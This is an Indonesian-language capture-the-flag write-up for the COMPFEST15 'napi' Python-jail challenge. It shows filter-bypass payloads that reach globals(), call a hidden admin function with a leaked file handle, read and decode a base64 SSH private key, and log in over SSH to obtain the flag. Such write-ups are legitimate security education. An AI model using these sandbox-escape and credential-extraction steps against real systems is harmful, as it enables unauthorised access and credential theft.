# Writeup napi

Pertama, kita harus melihat apa saja yang ada di globals() menggunakan payload ini
```
print(__builtins__.__dict__['glo'+'bals']())
```

Hasilnya akan seperti ini.
```
john > print(__builtins__.__dict__['glo'+'bals']())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x00000168AF5F4A60>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '\\\\wsl.localhost\\kali-linux\\home\\oka\\COMPFEST15\\napi\\src\\chall.py', '__cached__': None, 'password': <_io.TextIOWrapper name='creds.txt' mode='r' encoding='cp1252'>, 'main': <function main at 0x00000168AF65B2E0>, 'admin': <function admin at 0x00000168AF65B370>}
```

Kita akan menemukan function admin() dan sebuah object 'password' yang dimana isinya adalah file stream dari file password admin.

Setelah itu, kita harus mencari tahu argument apa saja yang dibutuhkan oleh function admin()

```
print(__builtins__.__dict__['glo'+'bals']()['ad'+'min'].__code__.co_varnames)
```

Payload itu akan menghasilkan ini.

```
john > print(__builtins__.__dict__['glo'+'bals']()['ad'+'min'].__code__.co_varnames)
('password_io', 'f')
```

Disini terlihat bahwa function admin membutuhkan sebuah 'password_io'. Maksudnya adalah file object yang sedang membuka password dari admin.

Dari sini, kita tinggal memanggil admin() dengan argument file object 'password' tadi.

```
__builtins__.__dict__['glo'+'bals']()['ad'+'min'](__builtins__.__dict__['glo'+'bals']()['pass'+'word'])
```

```
john > __builtins__.__dict__['glo'+'bals']()['ad'+'min'](__builtins__.__dict__['glo'+'bals']()['pass'+'word'])
Welcome admin!
Here's the flag:
--- IMPORTANT NOTICE ---

Dear admins, I have received information that a prisoner is trying to get access to the flag.
I have moved the flag somewhere safe.
I would advise you not to access the flag right now.
But if there is an urgent matter, login to admin@<ip-address>:6969 with your password as the SSH key to access the flag.
```

Terlihat bahwa flagnya tidak ada disini. Tapi, kita bisa login sebagai admin menggunakan SSH

Untuk mendapatkan SSH key, kita harus read file object password.

```
john > print(__builtins__.__dict__['glo'+'bals']()['pass'+'word'].read())
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0...
```

Kita harus decode ini menggunakan base64 dan menyimpan SSH keynya.

```
$ echo "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0..." | base64 -d > ssh.key
```

Dari sini kita bisa login sebagai admin melalui SSH.

```
$ ssh -p 6969 -i ssh.key admin@<ip_address>
Welcome to PRISON ADMINISTRATOR SHELL
Last login: Thu Apr 27 01:47:34 2023 from 172.30.0.1
$ ls
flag.txt
$ cat flag.txt
COMPFEST15{clo5e_y0ur_f1LE_0bj3ctS_plZzz___THXx!!!_63bf937957}
```